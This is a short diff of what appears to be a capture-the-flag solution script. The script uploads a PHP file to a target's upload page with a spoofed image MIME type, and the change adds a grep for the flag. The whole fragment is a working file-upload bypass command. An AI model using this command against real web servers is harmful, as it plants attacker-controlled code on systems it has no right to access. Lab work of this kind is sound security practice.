@@ -8,4 +8,4 @@ else
   read IP
 fi
 
-curl -F 'Upload=submit' -F 'uploaded=@hack.php;type=image/jpeg' http://$IP/?page=upload
+curl -F 'Upload=submit' -F 'uploaded=@hack.php;type=image/jpeg' http://$IP/?page=upload | grep 'flag'
